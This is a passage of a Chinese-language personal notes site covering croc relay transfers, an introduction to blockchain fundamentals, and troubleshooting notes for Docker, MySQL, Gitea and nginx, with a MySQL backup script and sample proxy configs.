<p>relay 会读取一个连接中发送过来的内容，并直接将内容写入到另一个连接中。从这也能得出结论：croc 没有使用类似 DNS 穿孔这样的技术，而是由中继服务器来转发传输内容，因此传输速度依旧会受到中继服务器的带宽限制。</p>
<p>但是当两端互相可发现（比如处于同一个局域网内），<code>croc</code> 的 <code>--ip value</code> 可以允许接收方来指定发送方的 IP 来直接从接收方获取传输内容，这样就不会经过中继服务器了。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="blockchain"><a class="header" href="#blockchain">Blockchain</a></h1>
<p>这块内容是区块链，本页面会介绍区块链基础知识。内容大多翻译自 substrate fundamentals 。</p>
<h2 id="区块链基础知识"><a class="header" href="#区块链基础知识">区块链基础知识</a></h2>
<p>区块链是一种去中心化的账本，它以一系列块( blocks )的形式记录信息。块中包含的信息是一组有序的指令，可能会导致状态发生变化。</p>
<p>在一个区块链网络中，计算机个体 —— 被称为节点 —— 通过去中心化点对点网络（<code>P2P</code>）在彼此间交流。 没有可以掌控这个网络的中央机构，通常，参与区块生产的每个节点都存储构成规范链的区块的副本。</p>
<p>在大多数情况下，用户通过提交可能导致状态变化的请求与区块链进行交互，例如，更改文件所有者或将资金从一个帐户转移到另一个帐户的请求。这些交易请求被传播到网络上的其他节点，并由区块作者（一般称为矿工）组装成一个区块。为了确保链上数据的安全性和链的持续进展，节点使用某种形式的共识机制来商定每个区块中数据的状态以及执行交易的顺序。</p>
<h2 id="何为区块链节点"><a class="header" href="#何为区块链节点">何为区块链节点</a></h2>
<p>在 high level 上，所有区块链节点都需要以下核心的组成部分：</p>
<ul>
<li>
<p>数据存储 —— 用于记录作为交易结果的状态变化。</p>
</li>
<li>
<p>用于节点间去中心化沟通的点对点网络（P2P，一般使用 <code>libp2p</code>）</p>
</li>
<li>
<p>共识机制，用来防止恶意活动破坏链，并确保链的持续进展。</p>
</li>
<li>
<p>排序和处理 传入交易的逻辑。</p>
</li>
<li>
<p>用于为区块生成哈希摘要（hash digests）以及签名和验证与交易关联的签名的密码学。</p>
</li>
</ul>
<p>由于构建区块链所需的核心组件所涉及的复杂性，大多数区块链项目从现有区块链代码库 fork 一个副本，以便开发人员可以修改现有代码以添加新功能，而不是从头开始编写所有内容。例如，Bitcoin 仓库被 fork 以创建 Litecoin、ZCash、Namecoin 和 Bitcoin Cash。类似地，Ethereum 被 fork 以创建 Quorum、POA Network、KodakCoin 和 Musicoin。</p>
<p>然而，大多数区块链平台的设计并不允许修改或定制。因此，通过 fork 来构建新的区块链有严重的限制，包括原来的区块链代码中固有的限制，比如可扩展性。</p>
<p>我们将会先了解大多数区块链共享的一些共同属性。</p>
<h2 id="状态的转换和冲突"><a class="header" href="#状态的转换和冲突">状态的转换和冲突</a></h2>
<p>区块链本质上是一个状态机。在任意时间点，区块链都有一个当前的内部状态。当入站交易被执行时，它们会导致状态的变化，因此区块链必须从其当前状态转换到新的状态。然而，可能有多个有效的要转换的状态，它们会导致不同的未来状态，区块链必须选择一个可以商定的状态来转换。要在转换后就状态而言达成一致，区块链中的所有操作都必须是确定性的。为了使链能够成功进展下去，大多数节点必须对所有状态转换达成一致，包括：</p>
<ul>
<li>
<p>链的初始状态，称为创世状态或创世块。</p>
</li>
<li>
<p>记录在每个块中的已执行的交易导致的一系列状态转换。</p>
</li>
<li>
<p>区块要包含在链中的最终状态。</p>
</li>
</ul>
<p>在中心化的网络中，中央机构可以在互斥的状态转换之间进行选择。例如，被配置成主要机构的服务器可能会按照它看到的顺序来记录状态转换的变化，或者在发生冲突时使用加权过程在竞争的替代方案之间进行选择。在去中心化的网络中，节点们可能以不同的顺序看到交易，因此它们必须使用更复杂的方法来选择交易并在存在冲突的状态转换之间进行选择。</p>
<p>区块链用来将交易打包成区块并选择哪个节点（矿工挖到矿）可以向链提交区块的方法，被称为区块链的共识模型或共识算法。最常用的共识模型称为工作量证明（<code>POW</code>，proof-of-work）共识模型。有了工作量证明共识模型，首先完成计算问题的节点（挖到矿的矿工）有权向链提交区块。</p>
<p>为了使区块链具有容错能力并提供一致的状态视图，即使一些节点受到恶意行为者或网络中断的破坏，但是一些共识模型需要至少三分之二的节点在任何时候都是同意状态。这种方式确保网络是可以容错的，并且可以承受一些网络参与者的不良行为，无论行为是故意的还是意外的。</p>
<h2 id="区块链经济学"><a class="header" href="#区块链经济学">区块链经济学</a></h2>
<p>所有区块链都需要资源 —— 处理器、内存、存储和网络带宽 —— 来执行操作。参与网络的计算机 —— 产生区块的节点（矿工） —— 向区块链用户提供这些资源。这些节点创建了一个分布式、去中心化的网络，满足参与者社区的需求。
为了支持一个社区并使区块链可持续发展，大多数区块链要求用户以交易费的形式来为他们使用的网络资源付费。支付交易费需要用户身份与持有某种类型资产的账户相关联。区块链通常使用代币来表示账户中资产的价值，网络参与者通过交易所，在链外购买代币。然后，网络参与者可以存入代币，使他们能够支付交易费用。</p>
<h2 id="区块链的治理"><a class="header" href="#区块链的治理">区块链的治理</a></h2>
<p>一些区块链允许网络参与者提交能够影响网络运营或区块链社区的提案，并对此进行投票。通过提交提案和投票 —— 公民投票 —— 区块链社区可以决定区块链在民主的情况下如何发展。然而，链上治理相对较少，要参与其中，区块链可能需要用户在账户中持有大量代币，或者被选为其他用户的代表。</p>
<h2 id="在区块链上运行的应用程序"><a class="header" href="#在区块链上运行的应用程序">在区块链上运行的应用程序</a></h2>
<p>在区块链上运行的应用程序 —— 通常被称为去中心化应用程序或 <code>dApp</code> —— 通常是使用前端框架编写的网络应用程序，但后端为智能合约，用于改变区块链状态。</p>
<p>智能合约是在区块链上运行并在特定条件下代表用户执行交易的程序。开发人员可以编写智能合约，以确保以开发者编写的逻辑执行的交易的结果被记录下来，并且不能被篡改。然而，仅凭智能合约，开发人员无法访问区块链的一些底层功能 —— 如共识、存储或交易层 —— 相反，他们必须遵守链的既定规则和限制。智能合约开发人员通常接受这些限制作为权衡，从而加快开发时间，减少核心设计决策。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="substrate"><a class="header" href="#substrate">substrate</a></h1>
<p>Learning......</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="这块内容记录的是我碰到过的一些问题以及解决过程"><a class="header" href="#这块内容记录的是我碰到过的一些问题以及解决过程">这块内容记录的是我碰到过的一些问题以及解决过程。</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h2 id="这一部分是-docker-相关的问题"><a class="header" href="#这一部分是-docker-相关的问题">这一部分是 docker 相关的问题</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h2 id="error-creating-overlay-mount-to"><a class="header" href="#error-creating-overlay-mount-to">error creating overlay mount to...</a></h2>
<blockquote>
<p>&quot;强制关机后再次重启机器后发现一些 docker 容器出现了 <code>error creating overlay mount to......</code> 并且无法启动&quot;</p>
</blockquote>
<p>该问题是与 <code>selinux</code> 相关的，有一 issue 与该问题相关<a href="https://github.com/coreos/bugs/issues/2340">#2430</a></p>
<p>查看 <code>/etc/selinux/config</code> ，<code>selinux</code> 状态为 <code>disabled</code> ，在将其设置为 <code>permissive</code> 后重启机器解决了该问题。</p>
<p><a href="https://github.com/coreos/bugs/issues/2340">#2430</a> 中有老哥提到禁用 <code>selinux</code> 解决了他的问题，但是我的情况是本身 <code>selinux</code> 状态就是 <code>disabled</code> ，在修改为 <code>permissive</code> 后解决了该问题。</p>
<h2 id="error-response-from-daemon-cannot-restart-container-drone-driver-failed-programming-external-connectivity-on-endpoint-drone-7df4fc8df955812c87a501d92249f4e9eb41ee820908569ca3cb98544b2bad9c--iptables-failed-iptables---wait--t-nat--a-docker--p-tcp--d-00---dport-3001--j-dnat---to-destination-172170780---i-docker0-iptables-no-chaintargetmatch-by-that-name"><a class="header" href="#error-response-from-daemon-cannot-restart-container-drone-driver-failed-programming-external-connectivity-on-endpoint-drone-7df4fc8df955812c87a501d92249f4e9eb41ee820908569ca3cb98544b2bad9c--iptables-failed-iptables---wait--t-nat--a-docker--p-tcp--d-00---dport-3001--j-dnat---to-destination-172170780---i-docker0-iptables-no-chaintargetmatch-by-that-name">Error response from daemon: Cannot restart container drone: driver failed programming external connectivity on endpoint drone (7df4fc8df955812c87a501d92249f4e9eb41ee820908569ca3cb98544b2bad9c):  (iptables failed: iptables --wait -t nat -A DOCKER -p tcp -d 0/0 --dport 3001 -j DNAT --to-destination 172.17.0.7:80 ! -i docker0: iptables: No chain/target/match by that name.</a></h2>
<p>这种错误一般是由于 dockerd 定义的 iptables 自定义链因为一些原因（最常见的就是发生在操作防火墙后）被清除了。此时把 docker 重启一下，让它重新生产自定义链即可。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="这一部分是-mysql-相关的问题"><a class="header" href="#这一部分是-mysql-相关的问题">这一部分是 mysql 相关的问题</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h2 id="error-cant-start-server-cant-check-pid-filepath-no-such-file-or-directory"><a class="header" href="#error-cant-start-server-cant-check-pid-filepath-no-such-file-or-directory">[ERROR] Can't start server: can't check PID filepath: No such file or directory</a></h2>
<blockquote>
<p>“强制关机后 <code>mysql</code> （指物理机上部署，非容器）怎么启动不了了？！”</p>
</blockquote>
<p>这个报错是由于强制关机导致 <code>mysql</code> <code>pid</code> 文件丢失，查看 <code>mysql</code> 配置文件，找到 <code>pid</code> 文件位置，创建 <code>pid</code> 文件所在的目录并 <code>chown mysql:mysql &lt;目录&gt;</code>即可</p>
<h2 id="error-fatal-error-please-read-security-section-of-the-manual-to-find-out-how-to-run-mysqld-as-root"><a class="header" href="#error-fatal-error-please-read-security-section-of-the-manual-to-find-out-how-to-run-mysqld-as-root">[ERROR] Fatal error: Please read &quot;Security&quot; section of the manual to find out how to run mysqld as root</a></h2>
<pre><code class="language-bash"># 指定用户来启动 mysqld
mysqld --user=&lt;USER&gt; 
</code></pre>
<h2 id="备份脚本例子"><a class="header" href="#备份脚本例子">备份脚本例子</a></h2>
<pre><code class="language-zsh">#!/bin/bash
mysql_user=&quot;xxxx&quot;
mysql_password=&quot;xxxx&quot;
mysql_host=&quot;xxxx&quot;
mysql_port=&quot;xxxx&quot;
backup_dir=/opt/mysql_backup

dt=`date +'%Y%m%d_%H%M'`
echo &quot;Backup Begin Date:&quot; \$(date +&quot;%Y-%m-%d %H:%M:%S&quot;)

# 备份全部数据库
mysqldump -h\$mysql_host -P\$mysql_port -u\$mysql_user -p\$mysql_password -R -E --all-databases --single-transaction &gt; \$backup_dir/mysql_backup_\$dt.sql

find \$backup_dir -mtime +7 -type f -name '*.sql' -exec rm -rf {} \;
echo &quot;Backup Succeed Date:&quot; \$(date +&quot;%Y-%m-%d %H:%M:%S&quot;)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="这一部分是-gitea-相关的问题"><a class="header" href="#这一部分是-gitea-相关的问题">这一部分是 gitea 相关的问题</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h2 id="unable-to-create-internal-queue-for-xxx-error-unable-to-create-queue-level-for-xxx-with-cfg-"><a class="header" href="#unable-to-create-internal-queue-for-xxx-error-unable-to-create-queue-level-for-xxx-with-cfg-">Unable to create internal queue for XXX Error: Unable to create queue level for XXX with cfg ...</a></h2>
<p>按 <a href="https://github.com/go-gitea/gitea/issues/18917#issuecomment-1052342880">#18917 中的一条回复</a> 中，发现没有 <code>LOCK</code> 文件，然后删除了 <code>data/queues/common</code> 后解决了该问题。</p>
<p>该 issue 中提到推荐采用 <code>redis</code> 来做 <code>queue</code>，配置方式在 <a href="https://docs.gitea.io/en-us/config-cheat-sheet/#indexer-indexer">Config Cheat Sheet - Docs</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="这一部分是-nginx-相关的问题"><a class="header" href="#这一部分是-nginx-相关的问题">这一部分是 nginx 相关的问题</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h2 id="反向代理"><a class="header" href="#反向代理">反向代理</a></h2>
<p><a href="https://nginx.org/en/docs/http/ngx_http_proxy_module.html">Module ngx_http_proxy_module</a></p>
<h3 id="保护-host-header"><a class="header" href="#保护-host-header">保护 host header</a></h3>
<p>在使用 nginx 对 minio 进行反向代理时，遇到了这个 issue <a href="https://github.com/minio/minio/issues/7936">#7936</a> 。原因是没有保护 Host header。</p>
<p>minio 官方给出的配置如下：</p>
<pre><code class="language-nginx">server {
 listen 80;
 server_name example.com;

 # To allow special characters in headers
 ignore_invalid_headers off;
 # Allow any size file to be uploaded.
 # Set to a value such as 1000m; to restrict file size to a specific value
 client_max_body_size 0;
 # To disable buffering
 proxy_buffering off;

 location / {
   proxy_set_header X-Real-IP \$remote_addr;
   proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
   proxy_set_header X-Forwarded-Proto \$scheme;
   proxy_set_header Host \$http_host; # 主要是此处，保护 host header

   proxy_connect_timeout 300;
   # Default is HTTP/1, keepalive is only enabled in HTTP/1.1
   proxy_http_version 1.1;
   proxy_set_header Connection &quot;&quot;;
   chunked_transfer_encoding off;

   proxy_pass http://localhost:9000; # If you are using docker-compose this would be the hostname i.e. minio
   # Health Check endpoint might go here. See https://www.nginx.com/resources/wiki/modules/healthcheck/
   # /minio/health/live;
 }
}
</code></pre>
<p><a href="http://nginx.org/en/docs/http/ngx_http_upstream_module.html#keepalive">Module ngx_http_upstream_module#keepalive</a> 中提到：</p>
<blockquote>
<p>For HTTP, the proxy_http_version directive should be set to “1.1” and the “Connection” header field should be cleared</p>
</blockquote>
<pre><code class="language-nginx">proxy_http_version 1.1;
proxy_set_header Connection &quot;&quot;;
</code></pre>
<h3 id="解决跨域"><a class="header" href="#解决跨域">解决跨域</a></h3>
<pre><code class="language-nginx">location /api {
    add_header Access-Control-Allow-Origin * always;
    add_header Access-Control-Allow-Headers *;
    add_header Access-Control-Allow-Methods &quot;GET, POST, PUT, OPTIONS&quot;;
    proxy_pass https://baidu.com;
}
</code></pre>
<h2 id="location-块"><a class="header" href="#location-块">location 块</a></h2>
<p><a href="https://nginx.org/en/docs/http/ngx_http_core_module.html#location">Module ngx_http_core_module#location</a></p>
<p>路径正则匹配是选择匹配度最高的一条规则（nginx 会先选中前缀最长的，然后在逐个规则匹配，匹配成功后不再继续匹配）。</p>
<p>例如：</p>
<pre><code class="language-nginx">location /abc {...}
location /abc/d {...}
</code></pre>
<blockquote>
<p>To find location matching a given request, nginx first checks locations defined using the prefix strings (prefix locations). Among them, the location with the longest matching prefix is selected and remembered. Then regular expressions are checked, in the order of their appearance in the configuration file. The search of regular expressions terminates on the first match, and the corresponding configuration is used.</p>
</blockquote>
<p>所以 /abc/d 路径的请求不会被 /abc location 拦截。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="这里存放一些连接"><a class="header" href="#这里存放一些连接">这里存放一些连接</a></h1>
<h2 id="tcp"><a class="header" href="#tcp">TCP</a></h2>
<p><a href="https://www.ietf.org/rfc/rfc0793.txt">rfc793 原件</a></p>
<p>rfc793 是 1981 年的文件了，一些内容与目前实际情况有所不同</p>
<h2 id="meilisearch"><a class="header" href="#meilisearch">Meilisearch</a></h2>
<p><a href="https://github.com/meilisearch/meilisearch/discussions/2070">Experimental feature: auto-batching · Discussion #2070 · meilisearch/meilisearch · GitHub</a></p>
<p>开启自动批处理 <code>--enable-auto-batching</code> 来提升索引速度。 </p>

                    <div id="giscus-container"></div>
                </main>

                <nav class="nav-wrapper" aria-label="Page navigation">
                    <!-- Mobile navigation buttons -->
                    <div style="clear: both"></div>
                </nav>
            </div>
        </div>

        <nav class="nav-wide-wrapper" aria-label="Page navigation">
        </nav>

    </div>

    <script type="text/javascript">
        window.playground_copyable = true;
    </script>
    <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
    <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
    <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
    <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
    <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
    <script src="book.js" type="text/javascript" charset="utf-8"></script>
    <script type="text/javascript" charset="utf-8">
        var pagePath = "print.md"
    </script>


    <!-- Custom JS scripts -->
    <script type="text/javascript" src="assets/custom.js"></script>
    <script type="text/javascript" src="assets/bigPicture.js"></script>
    <script type="text/javascript">
        window.addEventListener('load', function () {
            window.setTimeout(window.print, 100);
        });
    </script>
</body>

</html>